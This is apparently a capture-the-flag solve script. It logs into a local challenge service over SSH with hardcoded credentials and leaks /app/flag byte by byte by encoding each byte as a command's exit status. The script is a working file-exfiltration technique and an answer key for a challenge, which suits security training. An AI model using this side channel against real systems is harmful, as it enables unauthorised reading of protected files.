#!/bin/python3 -u

import paramiko
import sys

target = { "hostname": "127.0.0.1", "port": 10001 }
credentials = { "username": "hero", "password": "sQoLF72o10XqhUmF" }
cmd = "od -An -t d1 -N1 -j{0} /app/flag"

def get_flag(client):
    status, skip = 256, 0
    while status and skip < 100:
        channel = client.get_transport().open_session()
        channel.exec_command(f"exit $({cmd.format(skip)})")
        status = channel.recv_exit_status()
        if status:
            print(chr(status & 0xFF), end="")
        channel.close()
        skip += 1


client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
client.connect(**target, **credentials)

print("Connected to {hostname}:{port}".format(**target))
get_flag(client)

client.close()
